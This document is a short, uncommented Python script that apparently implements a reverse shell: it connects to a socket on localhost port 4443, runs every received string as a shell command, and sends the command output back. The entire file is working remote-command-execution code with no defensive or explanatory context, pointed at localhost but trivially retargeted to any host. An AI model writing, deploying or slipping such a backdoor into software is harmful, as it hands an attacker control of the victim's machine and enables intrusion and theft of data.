import socket
import subprocess

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("localhost",4443))

while True:
    data = s.recv(1024)

    outputs = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
    result =outputs.stdout.read()+outputs.stderr.read()
    s.sendall(result)
